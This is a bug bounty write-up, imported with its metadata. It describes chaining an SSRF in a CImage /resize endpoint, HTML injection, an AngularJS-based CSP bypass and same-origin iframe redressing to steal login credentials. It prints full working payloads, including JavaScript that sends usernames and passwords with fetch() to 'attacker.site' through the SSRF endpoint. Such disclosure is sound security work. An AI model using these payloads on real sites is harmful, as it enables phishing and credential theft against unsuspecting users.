---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-20_the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss.md
original_filename: 2024-03-20_the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss.md
title: The story of exposed service, SSRF, CSP bypass and credentials stealing via
  XSS
category: documents
detected_topics:
- xss
- rate-limit
- ssrf
- command-injection
- automation-abuse
- clickjacking
tags:
- imported
- documents
- xss
- rate-limit
- ssrf
- command-injection
- automation-abuse
- clickjacking
language: en
raw_sha256: 966181acf0e17c0adf7cd9e91381edbd9e82032699a6ff97ef4e398abea793cc
text_sha256: e60076a905e8f9e0e67d0f7dbd5c1df0ad98a57b84d707bd394f4f0ed8474d76
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# The story of exposed service, SSRF, CSP bypass and credentials stealing via XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-20_the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss.md
- Source Type: markdown
- Detected Topics: xss, rate-limit, ssrf, command-injection, automation-abuse, clickjacking
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `966181acf0e17c0adf7cd9e91381edbd9e82032699a6ff97ef4e398abea793cc`
- Text SHA256: `e60076a905e8f9e0e67d0f7dbd5c1df0ad98a57b84d707bd394f4f0ed8474d76`


## Content

---
title: "The story of exposed service, SSRF, CSP bypass and credentials stealing via XSS"
page_title: "The story of exposed service, SSRF, CSP bypass and credentials stealing via XSS - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss/"
final_url: "https://bergee.it/blog/the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
bugs: ["SSRF", "HTML injection", "CSP bypass", "XSS"]
bounty: "200"
publication_date: "2024-03-20"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 369
---

# The story of exposed service, SSRF, CSP bypass and credentials stealing via XSS

Posted on [2024-03-202026-04-27](https://bergee.it/blog/the-story-of-exposed-service-ssrf-csp-bypass-and-credentials-stealing-via-xss/) by [bergee](https://bergee.it/blog/author/bergee/)

Hello there

Another day, another bug 🙂 I started looking at the portal at redacted.com. The portal was written with PHP so I started fuzzing it a bit with fuff. Due to rate limiting this took some time. I found the endpoind called /resize. When I entered it I saw just:
  
  
  [img] Must set src-attribute.

Ok I tried something with /resize?src=xxx and saw:
  
  
  [img] Source image is not a valid file, check the filename and that a matching file exists on the filesystem.

Now I decided to check wayback machine urls for the redacted.com using Tomnomnom’s waybackurls. I found the url:
  
  
  https://redacted.com/resize?src=https://redacted.com/img/bg/someimage.jpg&sc=full_background

I checked the URL and I saw an image. It looked like the src parameter can point to the remote URL. Nice :). I decided to put the URL from webhook site here:
  
  
  https://redacted.com/resize?src=https://webhook.site/af211425-270b-4c78-82eb-b0469071785f

In response I saw the following header:
  
  
  CImage/v0.7.11 (2016-04-18) (PHP/5.6.40-pl14-zoneos cURL)

Now I knew PHP version and the exposed CImage service with the exact version. What the hell is CImage. Well, it is a library written in PHP for image processing.

### **Portscannig SSRF**

The first thing that came to my mind was SSRF. I’ve been playing a bit with remote urls but I could not read any data from my own server. I tried the 127.0.0.1 and the same situation. So I tried my server with both opened and closed ports. When I tried the closed port, the response was:
  
  
  Failed retrieving url, details follows: Operation timed out after 5005 milliseconds with 0 bytes received -

When I tried the open port, the message was:
  
  
  Failed retrieving url, details follows: Received HTTP/0.9 when not allowed

I tried the same technique with localhost:
  
  
  https://redacted.com/resize?src=http://127.0.0.1:22
  
  
  https://redacted.com/resize?src=http://127.0.0.1:888

and received the same errors. I had a port scanning ssrf bug. Not much but still the bug. Reported it.

### **HTML injection time**

I read the source code of the service and found out that the message I saw at the beginning was available in debugging mode. I read the documentation and found the “verbose” option. This option was available only in debugging mode and gave me a lot of details of an image. I used the remote image of Tux from Wikimedia. The link was:
  
  
  https://redacted.com/resize?src=https://upload.wikimedia.org/wikimedia/commons/a/af/Tux.png&verbose

![](https://bergee.it/blog/wp-content/uploads/2024/03/tux_verbose_redacted.jpg)

Then I decided to look at more options and I found the save-as option which was reflected in the link in the image above. I was testing other options but this one gave me no errors while putting different payloads in it.

I tried this one:
  
  
  https://redacted.com/resize?src=dummy&verbose&save-as=xx"></script><h1><font color="red">HTML injection</font><br></h1>

And the result was:

![](https://bergee.it/blog/wp-content/uploads/2024/03/html_injection_redacted.jpg)

The dummy as src was another option which put blank image , so I didn’t have to get any image from the remote sources, saving time while testing.

### **Hunting for XSS**

I tried this url:

https://redacted.com/resize?src=dummy&verbose&save-as=xx”><img src=x onerror=alert(1)>

and… nothing happend despite the XSS payload being properly reflected in the website source. I examined the developer console and saw some red messages. I quickly understood there is a CSP (Content Security Policy) that blocks inline javascript code execution.

![](https://bergee.it/blog/wp-content/uploads/2024/03/csp__warning.jpg)

The full CSP header looked like this:

![](https://bergee.it/blog/wp-content/uploads/2024/03/csp_full.jpg.png)

I decided not to give up and try to bypass the CSP. As we can see, the _script-src ‘self’_ rule prevents from loading js script files from other sources inluding event handler such as _< img src=x onerror=alert(1)_. That’s why nothing happened when I tried my XSS payload. This rule, however,, specifies the secure source from which the js scripts may be loaded. There is “https://ajax.googleapis.com” among them, which hold the various js libararies including AngularJS. You know where it goes. I used this “secure source” to include AngularJS 1.6 into site and then I used the AngularJS payload to fire the XSS:
  
  
  https://redacted.com/resize?src=dummy&verbose&save-as=x")</script><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script><k ng-app>{{$on.constructor('alert(document.domain)')()}}</k>

![](https://bergee.it/blog/wp-content/uploads/2024/03/csp_xss_redacted-1.jpg)

This way I bypassed the CSP but.. what next? I could report this as it is, however this site didn’t have any sensitive information I could steal with this XSS. The application session cookies had “http-only” flag and so I could not read them with js.

At first I thouht it was dead end. After cooling down my brain, I came up with the idea how to make this attack more severe.

### **Web site disguising**

The main app login panel was located at https://redacted.com/login. The endpoint I found the XSS was https://redacted.com/resize. This is important here what these two endpoints were at the same domain. I checked if I can put the /login site into the iframe on /resize endpoint.

The X-Frame-Options header was set to SAMEORIGIN so I could do that. The idea was to redress the /resize endpoint with html and css injection, so that it looked exactly like the /login endpoint. I achieved that with several steps:

1\. Made the iframe full screen and hid scrollbars and framing
  
  
  <iframe name="frm" src="https://redacted.com/login" style="position:fixed; top:0; left:0; bottom:0; right:0;width:100%; height:100% ;top:0; left:0; bottom:0; right:0; border:none; margin:0; padding:0; overflow:hidden;">

2\. Hid unnecessary elements which remained on the screen (note this long blue url on the screenshot)
  
  
  <style>a{display:none}</style>

3\. Changed the both title of the site and the browser url.
  
  
  document.title="Redacted | Log in";history.pushState("", "", "/login")

This way I had the /resize endpoint disguised as the /login one, even with the original URL in the address bar. This worked because both endpoints were on the same domain.

### **Credentials stealing**

As I had no access to the app I could steal the user’s credentials as he/she’s been logging in to the app. I added some js code which reacts to the onChange event inside the frame, get the values of the login and password fields and send them with the fetch() to the attacker’s site. I could not put any GET parameters in the URL as the /resize endpoint cut them out, that’s why I put login and password as the parts of the url.
  
  
  window.frames[0].addEventListener("change",(function(e){fetch("https://attacker.site/"%2b"/"%2bwindow.frames[0].document.forms[0]["user"].value%2b"/"%2bwindow.frames[0].document.forms[0]["password"].value)}))

I entered some credentials and… nothing was sent. I looked at the dev console and saw some warnings. Again the CSP didn’t allow me to send the credentials to some random URL. Did I give up? Nope :). For some time I could not figure out how to send these values outside and suddenly the brilliant idea came to my mind. What if I used the same /resize endpoint for sending, as this endpoint supports remote URL with the src parameter? So I modified my payload to:
  
  
  window.frames[0].addEventListener("change",(function(e){fetch("https://redacted.com/resize?src=https://attacker.site/"%2b"/"%2bwindow.frames[0].document.forms[0]["user"].value%2b"/"%2bwindow.frames[0].document.forms[0]["password"].value)}))

That worked perfectly. For the POC I used https://webhook.site/. Putting all pieces together, the full payload was like:
  
  
  https://redacted.com/resize?src=dummy&verbose&save-as=x");</script><style>a{display:none}</style><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script><k ng-app>{{$on.constructor('document.title="Redacted | Log in";history.pushState("", "", "/login");window.frames[0].addEventListener("change",(function(e){fetch("https://redacted.com/resize?src=https://attacker.site/"%2bwindow.frames[0].document.forms[0]["user"].value%2b"/"%2bwindow.frames[0].document.forms[0]["password"].value)}))')()}}</k><iframe name="frm" src="https://redacted.com" style="position:fixed; top:0; left:0; bottom:0; right:0;width:100%; height:100%;top:0; left:0; bottom:0; right:0; border:none; margin:0; padding:0; overflow:hidden;"><!--

![](https://bergee.it/blog/wp-content/uploads/2024/03/webhooksite_redacted.jpg)

Reward: 200 EUR

See you next bug 🙂
